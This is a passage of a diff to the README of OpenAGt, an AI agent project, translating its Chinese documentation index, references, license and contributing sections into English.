-- 三层压缩算法设计
-- 工具并发分区实现
-- Provider 降级链设计
-- 安全威胁建模
-- 性能基准测试
-- Flutter 移动应用可行性
-- 实现路线图
+Topics covered:
+- Architecture comparison (OpenAGt vs Claude Code vs Hermes Agent)
+- Three-layer compaction algorithm design
+- Tool concurrency partitioning implementation
+- Provider fallback chain design
+- Security threat modeling
+- Performance benchmarks
+- Flutter mobile application feasibility
+- Implementation roadmap
 
-### 包文档
+### Package Documentation
 
-| 包 | 描述 |
-|-----|------|
-| [packages/openagt/README.md](./packages/openagt/README.md) | 核心智能体引擎 |
-| [packages/app/README.md](./packages/app/README.md) | SolidJS Web 应用 |
-| [packages/docs/README.md](./packages/docs/README.md) | Mintlify 文档站点 |
-| [packages/web/README.md](./packages/web/README.md) | Astro Starlight 文档 |
-| [packages/enterprise/README.md](./packages/enterprise/README.md) | 企业版功能 |
+| Package | Description |
+|---------|-------------|
+| [packages/openagt/README.md](./packages/openagt/README.md) | Core AI agent engine |
+| [packages/app/README.md](./packages/app/README.md) | SolidJS Web application |
+| [packages/docs/README.md](./packages/docs/README.md) | Mintlify documentation site |
+| [packages/web/README.md](./packages/web/README.md) | Astro Starlight documentation |
+| [packages/enterprise/README.md](./packages/enterprise/README.md) | Enterprise features |
 
-### 核心模块文档
+### Core Module Documentation
 
-| 模块 | 描述 |
-|------|------|
-| [packages/openagt/src/effect/README.md](./packages/openagt/src/effect/README.md) | Effect Framework 集成 |
-| [packages/openagt/src/acp/README.md](./packages/openagt/src/acp/README.md) | ACP 协议实现 |
-| [packages/openagt/src/sync/README.md](./packages/openagt/src/sync/README.md) | SyncEvent 事件溯源 |
-| [packages/openagt/src/provider/README.md](./packages/openagt/src/provider/README.md) | LLM Provider 抽象 |
-| [packages/openagt/src/mcp/README.md](./packages/openagt/src/mcp/README.md) | MCP 服务器管理 |
-| [packages/openagt/src/lsp/README.md](./packages/openagt/src/lsp/README.md) | LSP 语言服务器 |
+| Module | Description |
+|--------|-------------|
+| [packages/openagt/src/effect/README.md](./packages/openagt/src/effect/README.md) | Effect Framework integration |
+| [packages/openagt/src/acp/README.md](./packages/openagt/src/acp/README.md) | ACP protocol implementation |
+| [packages/openagt/src/sync/README.md](./packages/openagt/src/sync/README.md) | SyncEvent event sourcing |
+| [packages/openagt/src/provider/README.md](./packages/openagt/src/provider/README.md) | LLM Provider abstraction |
+| [packages/openagt/src/bus/README.md](./packages/openagt/src/bus/README.md) | Bus event bus (PubSub) |
+| [packages/openagt/src/mcp/README.md](./packages/openagt/src/mcp/README.md) | MCP server management |
+| [packages/openagt/src/lsp/README.md](./packages/openagt/src/lsp/README.md) | LSP server and diagnostics |
 
-### 设计系统
+### Design System
 
 - [OpenAGt Theme Design/](OpenAGt%20Theme%20Design/)
 
 ---
 
-## 参考资料
+## References
 
-- [OpenAGt](https://github.com/Yecyi/OpenAGt) — 基础项目
-- [Hermes Agent](https://github.com/NousResearch/hermes-agent) — 参考实现
-- [Vercel AI SDK](https://sdk.vercel.ai) — AI Provider 抽象
-- [Effect Framework](https://effect.website) — 函数式编程
+- [OpenAGt](https://github.com/Yecyi/OpenAGt) — Base project
+- [Hermes Agent](https://github.com/NousResearch/hermes-agent) — Reference implementation
+- [Vercel AI SDK](https://sdk.vercel.ai) — AI Provider abstraction
+- [Effect Framework](https://effect.website) — Functional programming
 - [Drizzle ORM](https://orm.drizzle.team) — SQLite ORM
-- [ACP Specification](https://agentclientprotocol.com/) — Agent 通信协议
+- [ACP Specification](https://agentclientprotocol.com/) — Agent communication protocol
 
 ---
 
-## 许可证
+## License
 
-MIT License — 参见 [LICENSE](./LICENSE)
-
----
-
-## 贡献指南
-
-欢迎贡献！提交 PR 前请阅读贡献指南。
+MIT License — see [LICENSE](./LICENSE)
 
 ---
 
-**注意：** OpenAGt 是一个独立的研究项目。它与 Anthropic、OpenAI 或 OpenAGt 团队没有关联、认可或支持关系。
+## Contributing
+
+Contributions are welcome! Please read the [Contributing Guide](./CONTRIBUTING.md) before submitting PRs.
+
+---
+
+**Note:** OpenAGt is an independent research project. It is not affiliated with, endorsed by, or supported by Anthropic, OpenAI, or the OpenAGt team.
